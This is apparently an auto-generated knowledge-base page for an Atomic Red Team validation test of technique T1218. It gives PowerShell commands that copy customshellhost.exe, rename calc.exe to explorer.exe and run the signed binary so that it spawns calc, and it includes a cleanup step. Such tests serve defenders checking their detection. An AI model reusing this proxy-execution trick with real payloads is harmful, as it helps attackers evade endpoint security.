---
atomic_guid: "b1eeb683-90bb-4365-bbc2-2689015782fe"
title: "LOLBAS CustomShellHost to Spawn Process"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218"
attack_technique_name: "Signed Binary Proxy Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "b1eeb683-90bb-4365-bbc2-2689015782fe"
  - "LOLBAS CustomShellHost to Spawn Process"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# LOLBAS CustomShellHost to Spawn Process

This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\windows\system32\` to `C:\temp\`, renaming `calc.exe` to `explorer.exe`.
Upon execution, customshellhost.exe will spawn calc.exe.
Note this will only work on Windows 10 or 11.
[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)
[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)

## Metadata

- Atomic GUID: b1eeb683-90bb-4365-bbc2-2689015782fe
- Technique: T1218: Signed Binary Proxy Execution
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1218/T1218.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Input Arguments

### dest_path

- description: Directory to copy files into
- type: path
- default: C:\test

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
if (-not (Test-Path #{dest_path})) {
New-Item -Path #{dest_path} -ItemType Directory
} else {
Write-Host "Directory #{dest_path} already exists." }
Copy-Item -Path "C:\windows\system32\customshellhost.exe" -Destination "#{dest_path}\customshellhost.exe" -Force
Copy-Item -Path "C:\windows\system32\calc.exe" -Destination "#{dest_path}\explorer.exe" -Force
#{dest_path}\customshellhost.exe
```

### Cleanup

```powershell
Remove-Item -Path #{dest_path} -Recurse -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml)
